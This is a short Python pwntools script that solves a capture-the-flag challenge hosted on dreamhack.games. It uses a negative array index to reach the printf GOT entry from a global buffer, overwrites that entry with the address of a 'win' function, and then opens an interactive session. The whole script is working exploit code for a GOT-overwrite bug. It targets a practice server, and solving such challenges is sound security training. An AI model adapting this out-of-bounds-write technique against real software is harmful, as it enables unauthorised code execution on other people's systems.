#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./prob', checksec=False)
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
#p = start()
p = remote("host8.dreamhack.games", 19533)

buf = elf.symbols['buf']          # 0x404080
printf_got = elf.got['printf']    # 0x404008
win = elf.symbols['win']          # 0x4011b6

idx = (printf_got - buf) // 8
assert idx == -15

u64_idx = (1 << 64) + idx

p.sendlineafter(b'val: ', str(u64_idx).encode())
p.sendlineafter(b'val: ', str(win).encode())

p.interactive()
